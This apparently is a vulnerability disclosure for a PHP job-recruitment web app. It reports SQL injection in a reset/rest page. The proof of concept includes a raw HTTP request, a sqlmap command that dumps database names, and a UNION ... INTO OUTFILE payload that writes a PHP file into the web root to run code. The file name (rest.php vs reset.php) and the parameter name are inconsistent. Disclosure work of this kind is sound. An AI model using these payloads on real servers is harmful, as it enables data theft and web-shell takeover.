# Job-recruitment-in-php has sql injection vulnerability in rest.php RCE

## supplier
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
rest.php
## describe
An unrestricted SQL injection attack exists in an Job-recruitment-in-php system.   The parameters that can be controlled are as follows: e. This function executes the e_log parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

![image-20241111085938985](https://github.com/user-attachments/assets/9686050b-972e-4919-84a5-fd3a551a2963)



## code analysis

The e parameter in rest.php is controlled and is directly carried into the SQL statement for execution, resulting in SQL injection.

![image-20241111090040329](https://github.com/user-attachments/assets/b31d701c-701e-46fb-867e-dfdf3a10c4d7)

Injection via parameter e

## POC

### GET DATA

```
GET /reset.php?e=2* HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=apdbj581m83cio8cj275e494dr
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

save as 2.txt

```
python sqlmap.py -r 2.txt --dbs
```

Get the database name: owlphin

![image-20241111091636550](https://github.com/user-attachments/assets/8bf8be54-2ae9-482b-ac80-43490d0c2b31)

![image-20241111090429024](https://github.com/user-attachments/assets/bcb6adac-4894-4c6d-8c00-91c03a20c877)

### Write Trojans

asset the url can write trojans: shell.php

```
http://airecruitmentsystem/reset.php?e=2' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,'<?php phpinfo();?>' into outfile 'D:/phpstudy_pro/WWW/ai-recruitment-system-master/shell.php'--+#
```

Then we can asset the shell.php.

exec phpinfo(); see the result.

```
http://airecruitmentsystem/shell.php
```

![image-20241111091348602](https://github.com/user-attachments/assets/e888bebe-7dec-41e8-854e-09f0a7cd9e39)

## Discover

于源天舟

